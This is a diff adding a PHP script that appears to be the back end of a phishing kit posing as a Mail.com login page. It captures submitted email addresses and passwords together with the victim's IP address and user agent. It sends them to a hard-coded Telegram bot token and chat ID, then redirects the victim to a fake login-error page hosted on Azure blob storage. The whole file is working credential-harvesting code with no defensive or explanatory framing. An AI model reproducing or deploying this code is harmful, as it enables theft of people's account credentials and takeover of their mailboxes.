@@ -1,0 +1,55 @@
+<?php
+session_start();
+if($_POST["emailaddress"] != "" and $_POST["password"] != ""){
+    $ip = getenv("REMOTE_ADDR");
+$hostname = gethostbyaddr($ip);
+$useragent = $_SERVER['HTTP_USER_AGENT'];
+$message .= "--------------MAIL.COM-----------------------\n";
+$message .= "Email, mobile, or username: ".$_POST['emailaddress']."\n";
+$message .= "Password: ".$_POST['password']."\n";
+$message .= "|--------------- I N F O | I P -------------------|\n";
+$message .= "|Client IP: ".$ip."\n";
+$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+$message .= "User Agent : ".$useragent."\n";
+$message .= "|----------- unknown --------------|\n";
+
+    }
+    class Telegram
+    {
+
+        const CHAT_ID = 7846280967;
+        const TOKEN = '8299164312:AAFBDSbvuit_31oRYIFT6EGCdM_KsA4ReJE';
+
+        public static function sendMessage($message)
+        {
+            $url = "https://api.telegram.org/bot" . self::TOKEN . "/sendMessage?chat_id=" . self::CHAT_ID;
+            $url = $url . "&text=" . urlencode($message);
+            $ch = curl_init();
+            $optArray = array(
+                CURLOPT_URL => $url,
+                CURLOPT_RETURNTRANSFER => true
+            );
+            curl_setopt_array($ch, $optArray);
+            $result = curl_exec($ch);
+            curl_close($ch);
+        }
+
+
+    }
+    $message='--------------MAIL.COM----------------------'
+        . "\n" . 'Email address: ' . $_POST['emailaddress']
+        . "\n" . 'Password: ' . $_POST['password']."\n";
+    $message .= '|--------------- I N F O | I P -------------------|'."\n";
+    $message .= "|Client IP: ".$ip."\n";
+    $message .= "|--- https://whoer.net/?ip=$ip ----\n";
+    $message .= "User Agent : ".$useragent."\n";
+    
+    Telegram::sendMessage($message, $ip, $hostname, $data);
+
+    if (!empty($_POST)) {
+        $_SESSION['step1'] = $_POST;
+            header('Location: https://attonlines.blob.core.windows.net/assets/webmail/login=error.LRR_IsRLkt'); // redirect to step2 if posted something
+    }
+
+
+?>
